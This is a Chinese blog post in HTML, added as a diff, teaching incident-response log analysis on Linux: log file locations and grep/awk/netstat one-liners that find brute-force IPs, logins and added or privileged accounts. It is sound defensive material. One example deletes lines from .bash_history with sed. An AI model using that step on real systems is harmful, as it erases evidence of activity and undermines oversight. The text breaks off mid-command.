@@ -1,0 +1,833 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>应急响应-日志分析 - 东隅 Blog</title><meta name="author" content="东隅">
+<meta name="author-link" content="">
+<meta name="description" content="" /><meta name="keywords" content='攻防, 应急响应' />
+  <meta itemprop="name" content="应急响应-日志分析">
+  <meta itemprop="datePublished" content="2024-08-15T09:31:01+08:00">
+  <meta itemprop="dateModified" content="2024-08-15T09:31:01+08:00">
+  <meta itemprop="wordCount" content="2141">
+  <meta itemprop="keywords" content="攻防,应急响应"><meta property="og:url" content="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E9%98%B2%E5%AE%88/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/37/">
+  <meta property="og:site_name" content="东隅 Blog">
+  <meta property="og:title" content="应急响应-日志分析">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-15T09:31:01+08:00">
+    <meta property="article:modified_time" content="2024-08-15T09:31:01+08:00">
+    <meta property="article:tag" content="攻防">
+    <meta property="article:tag" content="应急响应">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="应急响应-日志分析">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E9%98%B2%E5%AE%88/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/37/" /><link rel="prev" href="https://dongyu29.github.io/posts/owasp/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/114/" /><link rel="next" href="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E9%98%B2%E5%AE%88/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/38/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "应急响应-日志分析",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/dongyu29.github.io\/posts\/%E6%94%BB%E9%98%B2\/%E9%98%B2%E5%AE%88\/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94\/37\/"
+    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "攻防, 应急响应","wordcount":  2141 ,
+    "url": "https:\/\/dongyu29.github.io\/posts\/%E6%94%BB%E9%98%B2\/%E9%98%B2%E5%AE%88\/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94\/37\/","datePublished": "2024-08-15T09:31:01+08:00","dateModified": "2024-08-15T09:31:01+08:00","publisher": {
+      "@type": "Organization",
+      "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
+        "@type": "Person",
+        "name": "东隅"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ></a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ></a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item"><a href="/" title="东隅 Blog">Home</a></li><li class="breadcrumb-item"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" aria-current="page">应急响应-日志分析</li>
+    </ol>
+  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>应急响应-日志分析</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E6%94%BB%E9%98%B2/" class="post-category" title="Category - 攻防"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 攻防</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="2141 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 2200 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>11 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content" data-end-flag="-----（完）-----"><blockquote>
+<ol>
+<li>什么是日志？日志记录一个服务或应用程序在运行过程中所发生的事件和活动。</li>
+<li>日志分类 web日志 系统日志</li>
+<li>日志存放的位置</li>
+</ol>
+</blockquote>
+<h5 id="系统日志" class="heading-element"><span>0.0.0.1  系统日志</span>
+  <a href="#%e7%b3%bb%e7%bb%9f%e6%97%a5%e5%bf%97" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>我们要关注时间，去筛选 创建记录等可以找到隐藏账号；判断系统的安全日志可以分析它</p>
+<h6 id="linux" class="heading-element"><span>0.0.0.1.1  Linux</span>
+  <a href="#linux" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>####### 日志</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">日志文件</th>
+<th style="text-align:left">文件说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">/var/log/dmesg</td>
+<td style="text-align:left">内核信息</td>
+</tr>
+<tr>
+<td style="text-align:center">/var/log/daemon.log</td>
+<td style="text-align:left">用户和组的变更</td>
+</tr>
+<tr>
+<td style="text-align:center">/etc/rsyslog.conf</td>
+<td style="text-align:left">查看日志存放位置 在配置文件下面</td>
+</tr>
+<tr>
+<td style="text-align:center">/var/log/cron</td>
+<td style="text-align:left">记录了系统定时任务相关的日志。</td>
+</tr>
+<tr>
+<td style="text-align:center">/var/log/cups</td>
+<td style="text-align:left">记录打印信息的日志。</td>
+</tr>
+<tr>
+<td style="text-align:center">/var/log/dmesg</td>
+<td style="text-align:left">记录了系统在开机时内核自检的信息，也可以使用 dmesg 命令直接查看内核自检信息。</td>
+</tr>
+<tr>
+<td style="text-align:center">/var/log/mailog</td>
+<td style="text-align:left">记录邮件信息。</td>
+</tr>
+<tr>
+<td style="text-align:center">/var/log/message</td>
+<td style="text-align:left">检查系统启动和服务日志 ，记录系统重要信息的日志。这个日志文件中会记录 Linux 系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件。</td>
+</tr>
+<tr>
+<td style="text-align:center">/var/log/btmp</td>
+<td style="text-align:left">记录错误登录日志，这个文件是二进制文件，不能直接 vim 查看，而要使用 <code>lastb</code> 命令查看。</td>
+</tr>
+<tr>
+<td style="text-align:center">==/var/log/lastlog==</td>
+<td style="text-align:left">记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接 vim ，而要使用 ==lastlog==命令查看。</td>
+</tr>
+<tr>
+<td style="text-align:center">==/var/log/wtmp==</td>
+<td style="text-align:left">永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接 vim ，而需要使用 ==last== 命令来查看。</td>
+</tr>
+<tr>
+<td style="text-align:center">==/var/run/utmp==</td>
+<td style="text-align:left">记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接 vim ，而要使用 ==<code>w</code> ， <code>who</code> ， <code>users</code>==等命令来查询。</td>
+</tr>
+<tr>
+<td style="text-align:center">==/var/log/secure或/var/log/auth.log==</td>
+<td style="text-align:left">记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如 SSH 登录，su 切换用户，sudo 授权，甚至添加用户和修改用户密码都会记录在这个日志文件中。</td>
+</tr>
+</tbody>
+</table>
+<p>比较重要的几个日志：</p>
+<ul>
+<li>登录失败记录： <code>/var/log/btmp</code> ，对应命令：<code>lastb</code>    这个可以看到一堆爆破的ip 用户名</li>
+<li>最后一次登录： <code>/var/log/lastlog</code> ，对应命令：<code>lastlog</code></li>
+<li>登录成功记录： <code>/var/log/wtmp</code> ，对应命令：<code>last</code></li>
+<li>登录日志记录： <code>/var/log/secure</code></li>
+<li>目前登录用户信息：<code>/var/run/utmp</code> ，对应命令：<code>w</code> 、 <code>who</code> 、 <code>users</code></li>
+</ul>
+<p>以下需要一些常用的 SHELL 命令了，例如：<code>grep</code> 、 <code>sed</code> 、 <code>awk</code> 、 <code>find</code> 、<code>netstat</code> 等</p>
+<p>####### 日志查找技巧</p>
+<p>1、显示文件的前后几行</p>
+<p>我们可通过 Linux 下的 grep 命令相关参数控制检索上下文：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">##### 显示 file 文件里匹配 foo 字串的行以及上下 5 行</span>
+</span></span><span style="display:flex;"><span>grep -C <span style="color:#a6be9d">5</span> foo file
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">##### 显示 foo 及前 5 行</span>
+</span></span><span style="display:flex;"><span>grep -B <span style="color:#a6be9d">5</span> foo file
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">##### 显示 foo 及后 5 行</span>
+</span></span><span style="display:flex;"><span>grep -A <span style="color:#a6be9d">5</span> foo file</span></span></code></pre></div><p>2、查找含有摸字符串的所有文件</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>grep -rn <span style="color:#a6be9d">&#34;hello,world!&#34;</span></span></span></code></pre></div><p>其中，相关参数如下：</p>
+<ul>
+<li><code>-r</code> ：递归查找</li>
+<li><code>-n</code> ：显示行号</li>
+<li><code>-R</code> ：查找所有文件，包含子目录</li>
+<li><code>-i</code> ：忽略大小写</li>
+<li>命令若不指定文件，则表示当前目录下的所有文件，也可指定相关文件</li>
+</ul>
+<blockquote>
+<p>grep 命令更多用法可参考文章：https://linux.isisy.com/c/grep.html</p>
+</blockquote>
+<p>3、显示一个文件某几行</p>
+<p>例如文件从第 5 行开始，显示 10 行，即显示 5-14 行</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat input_file | tail -n +5 | head -n <span style="color:#a6be9d">10</span></span></span></code></pre></div><p>如图：</p>
+<p>[<img loading="lazy" src="https://image.isisy.com/images/2023/05/31/2023-05-31-21.05.10.png" alt="2023-05-31-21.05.10.png" srcset="https://image.isisy.com/images/2023/05/31/2023-05-31-21.05.10.png?size=small, https://image.isisy.com/images/2023/05/31/2023-05-31-21.05.10.png?size=medium 1.5x, https://image.isisy.com/images/2023/05/31/2023-05-31-21.05.10.png?size=large 2x" data-title="2023-05-31-21.05.10.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>4、查找文件</p>
+<p>例如，在 <code>/var</code> 目录下查找 <code>secure</code> 文件：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find /var -type f -name secure</span></span></code></pre></div><blockquote>
+<p>find 命令更多用法可参考文章：https://linux.isisy.com/c/find.html</p>
+</blockquote>
+<p>5、显示系统中有哪些账户</p>
+<p>命令如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /etc/passwd | awk -F <span style="color:#a6be9d">&#39;:&#39;</span> <span style="color:#a6be9d">&#39;{print $1}&#39;</span></span></span></code></pre></div><ul>
+<li><code>-F</code> ：指定域分隔符</li>
+<li><code>$0</code> 、 <code>$1</code> 、 <code>$2</code> ……<code>$n</code> ：<code>$0</code> 则表示所有域， <code>$1</code> 表示第一个域， <code>$n</code>表示第 n 个域</li>
+</ul>
+<blockquote>
+<p>awk 命令更多用法可参考文章：https://linux.isisy.com/c/awk.html</p>
+</blockquote>
+<p>6、除 root 之外，是否还有其它特权用户( uid 为 0 )：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>awk -F: <span style="color:#a6be9d">&#39;$3==0{print $1}&#39;</span> /etc/passwd</span></span></code></pre></div><p>7、删除文件指定行内容</p>
+<p>例如删除 <code>.bash_history</code> 文件中 10-20 行内容：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sed -i <span style="color:#a6be9d">&#34;10,20&#34;</span>d .bash_history</span></span></code></pre></div><blockquote>
+<p>sed 命令更多用法可参考文章：https://linux.isisy.com/c/sed.html</p>
+</blockquote>
+<p>####### 日志分析技巧</p>
+<p>日志查找，可以查一些敏感操作行为，例如 ssh 爆破等。</p>
+<p>1、定位有多少 IP 在爆破主机的 root 帐号：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>grep <span style="color:#a6be9d">&#34;Failed password for root&#34;</span> /var/log/secure | awk <span style="color:#a6be9d">&#39;{print $11}&#39;</span> | sort | uniq -c | sort -nr | more</span></span></code></pre></div><p>2、定位哪些 IP 在爆破：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>grep <span style="color:#a6be9d">&#34;Failed password&#34;</span> /var/log/secure | grep -E -o <span style="color:#a6be9d">&#34;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&#34;</span> | uniq -c</span></span></code></pre></div><p>3、爆破的用户名相关字典：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>grep <span style="color:#a6be9d">&#34;Failed password&#34;</span> /var/log/secure | perl -e <span style="color:#a6be9d">&#39;while($_=&lt;&gt;){ /for(.*?) from/; print &#34;$1\n&#34;;}&#39;</span> | uniq -c | sort -nr</span></span></code></pre></div><p>4、登陆成功的 IP 有哪些：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /var/log/auth.log.1 | grep -a <span style="color:#a6be9d">&#34;Accepted password for root&#34;</span> | awk <span style="color:#a6be9d">&#39;{print $11}&#39;</span> | sort | uniq -c | sort -nr | more</span></span></code></pre></div><p>5、登陆成功的日期、用户名、IP：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>grep <span style="color:#a6be9d">&#34;Accepted &#34;</span> /var/log/secure | awk <span style="color:#a6be9d">&#39;{print $1,$2,$3,$9,$11}&#39;</span></span></span></code></pre></div><p>6、增加用户的日志：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>grep <span style="color:#a6be9d">&#34;useradd&#34;</span> /var/log/secure</span></span></code></pre></div><p>7、删除用户的日志：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>grep <span style="color:#a6be9d">&#34;userdel&#34;</span> /var/log/secure</span></span></code></pre></div><p>8、su 切换用户日志如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>May <span style="color:#a6be9d">31</span> 21:36:25 centos su: pam_unix<span style="color:#ff636f">(</span>su-l:session<span style="color:#ff636f">)</span>: session opened <span style="color:#ff636f">for</span> user <span style="color:#58a1dd">test</span> by root<span style="color:#ff636f">(</span><span style="color:#58a1dd">uid</span><span style="color:#ff636f">=</span>0<span style="color:#ff636f">)</span></span></span></code></pre></div><p>9、sudo 授权执行日志如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>May <span style="color:#a6be9d">31</span> 21:37:31 centos sudo:    root : <span style="color:#58a1dd">TTY</span><span style="color:#ff636f">=</span>pts/2 ; <span style="color:#58a1dd">PWD</span><span style="color:#ff636f">=</span>/root ; <span style="color:#58a1dd">USER</span><span style="color:#ff636f">=</span>root ; <span style="color:#58a1dd">COMMAND</span><span style="color:#ff636f">=</span>/bin/ls</span></span></code></pre></div><p>10、软件安装日志文件 <code>/var/log/yum.log</code> ，检索该文件可查看软件安装相关记录：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff636f">[</span>root@localhost ~<span style="color:#ff636f">]</span><span style="color:#828b96;font-style:italic"># head -5 /var/log/yum.log</span>
+</span></span><span style="display:flex;"><span>Jan <span style="color:#a6be9d">11</span> 16:51:30 Installed: xmlstarlet-1.6.1-1.el7.x86_64
+</span></span><span style="display:flex;"><span>Jan <span style="color:#a6be9d">18</span> 16:55:31 Erased: libzip-devel-0.10.1-8.el7.x86_64
+</span></span><span style="display:flex;"><span>Jan <span style="color:#a6be9d">18</span> 16:55:32 Erased: libzip-0.10.1-8.el7.x86_64
+</span></span><span style="display:flex;"><span>Jan <span style="color:#a6be9d">18</span> 17:06:50 Installed: libzip-0.10.1-8.el7.x86_64
+</span></span><span style="display:flex;"><span>Jan <span style="color:#a6be9d">18</span> 17:06:50 Installed: libzip-devel-0.10.1-8.el7.x86_64
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>root@localhost ~<span style="color:#ff636f">]</span><span style="color:#828b96;font-style:italic"># </span></span></span></code></pre></div><p>11、根据端口列进程：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>netstat -ntlp | grep <span style="color:#a6be9d">&#34;:80 &#34;</span> | awk <span style="color:#a6be9d">&#39;{print $7}&#39;</span> | tr <span style="color:#a6be9d">&#39;/&#39;</span> <span style="color:#a6be9d">&#34;\t&#34;</span></span></span></code></pre></div><p>其中，<code>grep</code> 命令后面为你需要检索的端口。</p>
+<p>12、查找较多的 SYN 链接：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>netstat -an | grep SYN | awk <span style="color:#a6be9d">&#39;{print $5}&#39;</span> | awk -F: <span style="color:#a6be9d">&#39;{print $1}&#39;</span> | sort | uniq -c | sort -nr | more</span></span></code></pre></div><p>其中，<code>grep</code> 命令后面也可为不同的链接，如：<code>ESTABLISHED</code> 、 <code>CLOSE_WAIT</code> 等</p>
+<p>13、查看服务当前的并发连接数和 TCP 连接状态：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>netstat -n | awk <span style="color:#a6be9d">&#39;/^tcp/ {++S[$NF]} END {for(key in S) print key,&#34;\t&#34;,S[key]}&#39;</span></span></span></code></pre></div><p>14、查看不存在的用户名以及错误登陆的次数</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span> cat auth.log | grep -a  <span style="color:#a6be9d">&#34;Failed password for&#34;</span>|grep  <span style="color:#a6be9d">&#34;invalid&#34;</span> |  cut -d <span style="color:#a6be9d">&#34; &#34;</span> -f <span style="color:#a6be9d">11</span> | sort | uniq -c |sort -nr</span></span></code></pre></div><p>14、排除一个或多个用户，这里排除test和alict</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span> cat auth.log | grep -a  <span style="color:#a6be9d">&#34;Failed password for&#34;</span>|grep  <span style="color:#a6be9d">&#34;invalid&#34;</span> | grep -v <span style="color:#a6be9d">&#34;test\|alict&#34;</span> | cut -d <span style="color:#a6be9d">&#34; &#34;</span> -f <span style="color:#a6be9d">11</span> | sort -nr | uniq | <span style="color:#ff636f">while</span> <span style="color:#58a1dd">read</span> line;<span style="color:#ff636f">do</span> <span style="color:#58a1dd">echo</span> <span style="color:#ff636f">[</span><span style="color:#58a1dd">$line</span><span style="color:#ff636f">]</span>; cat auth.log | grep -a  <span style="color:#a6be9d">&#34;Failed password for&#34;</span> | grep <span style="color:#58a1dd">$line</span> | grep -Po <span style="color:#a6be9d">&#39;(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|[1-9])(\.(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|\d)){3} 